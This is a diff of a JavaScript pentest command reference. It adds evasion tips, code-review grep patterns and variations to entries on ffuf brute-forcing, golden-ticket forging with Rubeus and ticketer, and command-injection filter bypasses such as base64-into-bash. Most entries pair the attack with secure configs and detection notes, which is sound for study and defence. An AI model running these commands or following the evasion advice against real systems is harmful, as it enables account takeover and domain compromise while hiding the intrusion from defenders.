-      "command": "ffuf -w <wordlist.txt> -u http://<target>/index.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -fr 'Invalid username'",
+      "command": "ffuf -w <wordlist> -u http://<target>/index.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -fr 'Invalid username'",
       "description": "Brute-force a known account's password with ffuf, first tailoring rockyou to the target's password policy using grep/awk to slash the keyspace.",
       "platform": "linux",
       "requires": [],
@@ -6745,14 +7313,15 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The login endpoint applies no rate limiting, account lockout, or CAPTCHA — any number of password attempts can be submitted in rapid succession. Combined with a high-value username (discovered via enumeration), this enables offline-speed online brute forcing.",
         "vulnerable_config": "# No rate limiting on the login endpoint:\n# POST /login with 10,000 requests/second is accepted\n# No account lockout after N failures\n# No CAPTCHA, no MFA\n# HTTP Basic auth with no attempt throttling:\n# Authorization: Basic base64(user:password) — no protection against mass requests",
-        "secure_config": "# Express.js (Node) — rate limiting with express-rate-limit:\nconst rateLimit = require('express-rate-limit');\nconst loginLimiter = rateLimit({\n    windowMs: 15 * 60 * 1000,  // 15 minutes\n    max: 10,                    // 10 attempts per IP per window\n    skipSuccessfulRequests: true,\n    message: { error: 'Too many login attempts, please try again later.' }\n});\napp.post('/login', loginLimiter, loginHandler);\n\n# Django — django-ratelimit:\nfrom ratelimit.decorators import ratelimit\n@ratelimit(key='ip', rate='5/m', method='POST', block=True)\ndef login_view(request): ...\n\n# Also: progressive delays (1s, 2s, 4s) after each failure\n# Account lockout after 10 failures with admin unlock or 30-min auto-unlock\n# MFA as the primary defense (password brute becomes irrelevant)"
+        "secure_config": "# Express.js (Node) — rate limiting with express-rate-limit:\nconst rateLimit = require('express-rate-limit');\nconst loginLimiter = rateLimit({\n    windowMs: 15 * 60 * 1000,  // 15 minutes\n    max: 10,                    // 10 attempts per IP per window\n    skipSuccessfulRequests: true,\n    message: { error: 'Too many login attempts, please try again later.' }\n});\napp.post('/login', loginLimiter, loginHandler);\n\n# Django — django-ratelimit:\nfrom ratelimit.decorators import ratelimit\n@ratelimit(key='ip', rate='5/m', method='POST', block=True)\ndef login_view(request): ...\n\n# Also: progressive delays (1s, 2s, 4s) after each failure\n# Account lockout after 10 failures with admin unlock or 30-min auto-unlock\n# MFA as the primary defense (password brute becomes irrelevant)",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
       }
     },
     {
       "id": "auth-reset-token-brute",
       "name": "Broken Auth – Password Reset Token Brute-Force",
       "type": "command",
-      "command": "ffuf -w <tokens.txt> -u 'http://<target>/reset_password.php?token=FUZZ' -fr 'token is invalid'",
+      "command": "ffuf -w <wordlist> -u 'http://<target>/reset_password.php?token=FUZZ' -fr 'token is invalid'",
       "description": "Brute-force a short/predictable password-reset token (e.g. a 4-digit numeric code) to take over an account whose reset was initiated.",
       "platform": "linux",
       "requires": [],
@@ -6831,8 +7400,15 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
-      }
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
+      },
+      "variations": [
+        {
+          "label": "Short numeric token",
+          "command": "ffuf -w <wordlist> -u 'http://<target>/reset?token=FUZZ' -fr 'invalid'"
+        }
+      ]
     },
     {
       "id": "auth-bruteforce-protection-bypass",
@@ -6907,7 +7483,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
       }
     },
     {
@@ -6977,7 +7554,7 @@ const COMMAND_DATA = {
       "id": "auth-user-enum-ffuf",
       "name": "Broken Auth – Username Enumeration (ffuf)",
       "type": "command",
-      "command": "ffuf -w <usernames.txt> -u http://<target>/index.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=invalid' -fr 'Unknown user'",
+      "command": "ffuf -w <userlist> -u http://<target>/index.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=invalid' -fr 'Unknown user'",
       "description": "Enumerate valid usernames by abusing a login form that returns different error messages for unknown users vs wrong passwords ('Unknown user' vs 'Invalid password').",
       "platform": "linux",
       "requires": [],
@@ -7045,14 +7622,21 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Login and password-reset endpoints return different responses (different HTTP status codes, response bodies, timing, or redirect behavior) depending on whether a submitted username exists. An attacker can automate requests and compare responses to build a valid user list without guessing passwords.",
         "vulnerable_config": "# PHP — different responses for valid vs invalid user (vulnerable):\nif (!$user = db_find_user($_POST['email'])) {\n    die(json_encode(['error' => 'User not found']));  // reveals user doesn't exist\n}\nif (!password_verify($_POST['password'], $user['hash'])) {\n    die(json_encode(['error' => 'Incorrect password']));  // reveals user DOES exist\n}\n\n# Also: HTTP 404 vs 302 redirect on /reset-password?email=test@test.com",
-        "secure_config": "# Always return identical response regardless of whether user exists:\nif (!$user || !password_verify($_POST['password'], $user['hash'])) {\n    // Same message, same status code, same timing\n    die(json_encode(['error' => 'Invalid credentials']));\n}\n\n# For password reset — return same message whether email exists or not:\n// 'If an account with this email exists, a reset link has been sent.'\n\n# Timing attack fix — always run the hash comparison even if user not found:\n$dummy_hash = '$2y$10$invalid_hash_for_timing_protection';\n$hash = $user ? $user['hash'] : $dummy_hash;\npassword_verify($_POST['password'], $hash);  // always runs"
-      }
+        "secure_config": "# Always return identical response regardless of whether user exists:\nif (!$user || !password_verify($_POST['password'], $user['hash'])) {\n    // Same message, same status code, same timing\n    die(json_encode(['error' => 'Invalid credentials']));\n}\n\n# For password reset — return same message whether email exists or not:\n// 'If an account with this email exists, a reset link has been sent.'\n\n# Timing attack fix — always run the hash comparison even if user not found:\n$dummy_hash = '$2y$10$invalid_hash_for_timing_protection';\n$hash = $user ? $user['hash'] : $dummy_hash;\npassword_verify($_POST['password'], $hash);  // always runs",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
+      },
+      "variations": [
+        {
+          "label": "Filter on the 'user exists' response diff",
+          "command": "ffuf -w <userlist> -u http://<target>/login -X POST -d 'user=FUZZ&pass=x' -fr 'no such user'"
+        }
+      ]
     },
     {
       "id": "auth-vuln-password-reset",
       "name": "Broken Auth – Vulnerable Password Reset (Security Question)",
       "type": "command",
-      "command": "ffuf -w <answers.txt> -u http://<target>/security_question.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=<session>' -d 'security_response=FUZZ' -fr 'Incorrect response'",
+      "command": "ffuf -w <wordlist> -u http://<target>/security_question.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=<session>' -d 'security_response=FUZZ' -fr 'Incorrect response'",
       "description": "Exploit a password-reset flow gated by a guessable security question (e.g. 'city you were born in') by brute-forcing the answer from a small curated wordlist, then resetting another user's password.",
       "platform": "linux",
       "requires": [
@@ -7138,7 +7722,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
       }
     },
     {
@@ -7537,7 +8122,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1548",
           "MITRE T1548.001"
-        ]
+        ],
+        "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
       }
     },
     {
@@ -7632,17 +8218,17 @@ const COMMAND_DATA = {
         {
           "description": "Filter CT results for specific keyword subdomains (e.g. dev, staging, admin)",
           "command": "curl -s \"https://crt.sh/?q=<domain>&output=json\" | jq -r '.[] | select(.name_value | contains(\"<keyword>\")) | .name_value' | sort -u",
-          "label": "crt.sh JSON"
+          "label": "crt.sh - filter by keyword"
         },
         {
           "description": "List all subdomains from CT logs, deduplicated",
           "command": "curl -s \"https://crt.sh/?q=%.<domain>&output=json\" | jq -r '.[].name_value' | sort -u",
-          "label": "crt.sh JSON"
+          "label": "crt.sh - all subdomains"
         },
         {
           "description": "Show issuer + name_value fields (CA + domain)",
           "command": "curl -s \"https://crt.sh/?q=<domain>&output=json\" | jq -r '.[] | [.name_value,.issuer_name] | @csv' | sort -u",
-          "label": "crt.sh JSON"
+          "label": "crt.sh - name + issuer (CSV)"
         },
         {
           "description": "Query CT logs via certspotter API",
@@ -7728,7 +8314,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Password policies are insufficiently strict: minimum length too short (< 12 chars), no complexity requirement, no history check (allows password reuse), no lockout or too-lenient lockout threshold. Combined with credential reuse across services, a single cracked hash grants access to multiple systems.",
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
-        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
+        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout",
+        "evasion": "Offline/local activity — generate lists off-target; no on-network footprint."
       },
       "type": "command"
     },
@@ -7928,7 +8515,17 @@ const COMMAND_DATA = {
         "misconfiguration": "SID filtering not enforced between parent and child domains (default within a forest — by design). No MDI deployment. krbtgt passwords stale in child domains (attackers work down the trust chain systematically).",
         "vulnerable_config": "# SID filtering typically NOT applied within a forest (by design):\nGet-ADTrust -Filter {Target -eq 'CHILD.CORP.LOCAL'} | Select-Object SIDFilteringForestAware,SIDFilteringQuarantined\n# SIDFilteringForestAware: False, SIDFilteringQuarantined: False\n# → SID History in tickets crosses the trust = child DA → Forest EA\n\n# Required: child domain krbtgt hash (from child domain compromise):\n# Then: Rubeus /golden /user:DA /domain:child.corp.local /sid:<child-SID> /sids:<parent-EA-SID> /rc4:<krbtgt-hash>",
         "secure_config": "# Enable SID filtering on parent-child trust (breaks SID History but hardens forest):\nnetdom trust CHILD.CORP.LOCAL /domain:CORP.LOCAL /enablesidhistory:no /filtersids:yes\n\n# Or use Selective Authentication on forest trust:\nSet-ADTrust CHILD.CORP.LOCAL -SelectiveAuthentication $true\n\n# Deploy MDI on ALL DCs including child domain DCs:\n# MDI cross-domain correlation detects privilege escalation across trust boundaries\n\n# Treat child domain compromise as forest compromise:\n# Incident response: rotate krbtgt in BOTH child and parent domains\n# + change all DA passwords in both domains"
-      }
+      },
+      "variations": [
+        {
+          "label": "AES256 key",
+          "command": "Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+        },
+        {
+          "label": "Impacket ticketer",
+          "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> Administrator"
+        }
+      ]
     },
     {
       "id": "chisel-socks",
@@ -8024,10 +8621,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Forward - Server (pivot)",
-          "command": "./chisel server -v -p <port> --socks5"
-        },
         {
           "label": "Forward - Client (attacker)",
           "command": "./chisel client -v <pivot_ip>:<port> socks"
@@ -8468,7 +9061,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "A non-DC computer or service account has unconstrained Kerberos delegation enabled (TrustedForDelegation = True). When any user authenticates to that machine, their TGT is forwarded to it automatically. If an attacker compromises the machine, they can extract all the forwarded TGTs — including Domain Admin TGTs if a DA was coerced to authenticate (e.g., via PrinterBug/PetitPotam).",
         "vulnerable_config": "# Finding unconstrained delegation hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |\n    Select-Object Name, TrustedForDelegation\n# Legitimate: Domain Controllers\n# NOT legitimate: fileserver01, webserver02, etc.\n\n# Service account with unconstrained delegation:\nGet-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation",
-        "secure_config": "# Remove unconstrained delegation from all non-DC hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} |\n    Where-Object {$_.Name -notmatch 'DC'} |\n    Set-ADComputer -TrustedForDelegation $false\n\n# Use constrained delegation instead (specific services only):\nSet-ADComputer fileserver01 -TrustedForDelegation $false\n# Then configure resource-based constrained delegation:\nSet-ADComputer fileserver01 -PrincipalsAllowedToDelegateToAccount webserver01\n\n# Protected Users group — members cannot be delegated:\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins'\n\n# Enable Kerberos Armoring (FAST) to prevent TGT forwarding abuse"
+        "secure_config": "# Remove unconstrained delegation from all non-DC hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} |\n    Where-Object {$_.Name -notmatch 'DC'} |\n    Set-ADComputer -TrustedForDelegation $false\n\n# Use constrained delegation instead (specific services only):\nSet-ADComputer fileserver01 -TrustedForDelegation $false\n# Then configure resource-based constrained delegation:\nSet-ADComputer fileserver01 -PrincipalsAllowedToDelegateToAccount webserver01\n\n# Protected Users group — members cannot be delegated:\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins'\n\n# Enable Kerberos Armoring (FAST) to prevent TGT forwarding abuse",
+        "evasion": "Fire the coercion briefly to grab one authentication, then stop; choose whichever coercion protocol (printerbug/DFSCoerce/PetitPotam) is unpatched to avoid failed-attempt noise."
       }
     },
     {
@@ -8586,7 +9180,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1083",
           "CVE-2010-2861"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -8672,7 +9267,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1595.002",
           "OWASP A05:2021"
-        ]
+        ],
+        "evasion": "Randomize the uploaded payload name and delete it after the shell connects; restrict activity to a single upload+trigger to limit web-log evidence."
       }
     },
     {
@@ -8787,7 +9383,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "CVE-2009-2265"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -8864,10 +9461,6 @@ const COMMAND_DATA = {
       "command": "echo -n 'cat /etc/passwd | grep 33' | base64\nbash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)",
       "variations": [
         {
-          "label": "Linux",
-          "command": "echo -n 'cat /etc/passwd | grep 33' | base64\nbash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)"
-        },
-        {
           "label": "Windows PowerShell",
           "command": "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\niex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\""
         },
@@ -8897,7 +9490,9 @@ const COMMAND_DATA = {
         "why_it_works": "bash<<<$(base64 -d<<<BASE64STRING) decodes the base64 string to a shell command and executes it via here-string (<<<). The blacklisted command is encoded as base64 — only alphanumeric characters + = appear in the payload, bypassing all metacharacter filters. The full command (including spaces, pipes, paths) is encoded. Windows PowerShell equivalent uses [System.Convert]::FromBase64String() + iex. Works even with complex multi-pipe commands.",
         "impact": "The most powerful obfuscation technique — any arbitrary command, including complex pipelines with spaces, pipes, and special characters, can be encoded as base64 with only alphanumeric characters in the payload. Bypasses virtually all character-level blacklists.",
         "detection": "[MITRE T1059] WAF: base64 -d, bash<<<, iex, FromBase64String in parameters. Decode base64 content in WAF for semantic analysis before applying rules. Process audit: actual decoded command visible in process arguments.",
-        "artifacts": "Access log: bash<<<$(base64 -d<<<...) pattern — base64 string visible in log. Process audit: actual decoded command executed by bash subprocess."
+        "artifacts": "Access log: bash<<<$(base64 -d<<<...) pattern — base64 string visible in log. Process audit: actual decoded command executed by bash subprocess.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -8973,10 +9568,6 @@ const COMMAND_DATA = {
       "command": "WhOaMi",
       "variations": [
         {
-          "label": "Windows",
-          "command": "WhOaMi"
-        },
-        {
           "label": "Linux - tr",
           "command": "$(tr \"[A-Z]\" \"[a-z]\"<<<\"WhOaMi\")"
         },
@@ -9006,7 +9597,9 @@ const COMMAND_DATA = {
         "why_it_works": "Windows CMD and PowerShell are case-insensitive — WhOaMi executes as whoami. Linux is case-sensitive but $(tr '[A-Z]' '[a-z]'<<<'WhOaMi') translates the mixed-case string to lowercase before execution via process substitution. $(a='WhOaMi';printf %s ${a,,}) uses bash's built-in lowercase parameter expansion. These bypass case-sensitive blacklist filters.",
         "impact": "Bypasses case-sensitive command blacklists on Linux and case-insensitive filters on Windows. Windows is inherently immune to case-sensitive filtering since the OS shell is case-insensitive.",
         "detection": "[MITRE T1059] WAF: case-insensitive matching of blacklisted commands. Linux: tr and printf in parameter context as command substitution wrappers. Process audit: actual command after shell normalisation.",
-        "artifacts": "Access log: mixed-case command names or $(tr...) / $(a=...) patterns in parameters."
+        "artifacts": "Access log: mixed-case command names or $(tr...) / $(a=...) patterns in parameters.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -9083,10 +9676,6 @@ const COMMAND_DATA = {
       "command": "echo ${PATH:0:1}    # -> /\n127.0.0.1%0als${IFS}${PATH:0:1}home",
       "variations": [
         {
-          "label": "Linux - slash from PATH",
-          "command": "echo ${PATH:0:1}    # -> /\n127.0.0.1%0als${IFS}${PATH:0:1}home"
-        },
-        {
           "label": "Linux - semicolon from LS_COLORS",
           "command": "echo ${LS_COLORS:10:1}   # -> ;\n127.0.0.1${LS_COLORS:10:1}${IFS}"
         },
@@ -9124,7 +9713,9 @@ const COMMAND_DATA = {
         "why_it_works": "When / and ; characters are blacklisted, environment variable substrings provide them without using the literal character. ${PATH:0:1} returns the first character of $PATH (which starts with /) — effectively the / character. ${LS_COLORS:10:1} returns ; from within the LS_COLORS value. Windows equivalent: %HOMEPATH:~6,-11% extracts a backslash from the HOMEPATH variable. These bypass character-level blacklists by constructing blocked characters from environment variables.",
         "impact": "Bypasses character blacklists blocking /, ;, or \\ — enables full path traversal and command chaining even when individual special characters are filtered.",
         "detection": "[MITRE T1059] WAF: ${...} and %VAR:...% patterns in parameters. Semantic analysis of parameter values is necessary — character-level blacklists are insufficient. Allowlist approach: only accept valid IP octets (digits and dots) for an IP field.",
-        "artifacts": "Access log: parameter values containing ${PATH:0:1}, ${IFS}, or Windows environment variable substring patterns."
